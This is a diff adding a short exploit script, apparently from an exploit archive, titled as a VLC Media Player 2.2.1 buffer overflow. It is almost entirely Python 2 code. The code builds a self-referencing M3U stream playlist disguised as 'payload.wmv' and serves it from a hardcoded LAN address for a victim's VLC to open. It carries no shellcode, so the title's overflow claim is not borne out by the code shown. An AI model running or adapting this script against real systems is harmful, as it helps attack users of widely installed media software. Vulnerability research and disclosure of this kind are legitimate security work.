@@ -1,0 +1,38 @@
+Exploit Title: VLC Media Player 2.2.1 Buffer Overflow
+2016-09-28
+Author: sultan albalawi
+Software Link: https://www.videolan.org/vlc/releases/2.2.1.html
+Tested on:win7
+video :https://www.facebook.com/pentest3/videos/vb.100012552940568/189735791454851/?type=2&theater&notif_t=video_processed&notif_id=1475012468070044
+
+*************************************************************************************
+filecreate = "payload.wmv" # create file (payload.wmv)
+buffer = ("\x23\x45\x58\x54\x4d\x33\x55\r\n\x23"+
+"\x45\x58\x54\x2d\x58\x2d\x53\x54\x52"+
+"\x45\x41\x4d\x2d\x49\x4e\x46\x3a\x50"+
+"\x52\x4f\x47\x52\x41\x4d\x2d\x49\x44"+
+"\x3d\x31\x2c\x42\x41\x4e\x44\x57\x49"+
+"\x44\x54\x48\x3d\x31\x2c\x52\x45\x53"+
+"\x4f\x4c\x55\x54\x49\x4f\x4e\x3d\x31"+
+"\x32\x30\x78\x33\x36\x30\r\n")
+buffer += filecreate
+open(filecreate, "wb").write(buffer)
+print "create file done {}".format(filecreate)
+import BaseHTTPServer
+import sys
+from SimpleHTTPServer import SimpleHTTPRequestHandler
+HandlerClass = SimpleHTTPRequestHandler
+ServerClass  = BaseHTTPServer.HTTPServer
+Protocol     = "HTTP/1.0"
+if sys.argv[1:]:
+    port = int(sys.argv[1])
+else:
+    port =8080
+server_address = ('192.168.100.3',8080)
+HandlerClass.protocol_version = Protocol
+httpd = ServerClass(server_address, HandlerClass)
+sa = httpd.socket.getsockname()
+print sa[0],sa[1],filecreate
+print "open vlc and open file {}".format(filecreate)
+print  "LISTENING..",sa[0],sa[1],filecreate
+httpd.serve_forever()
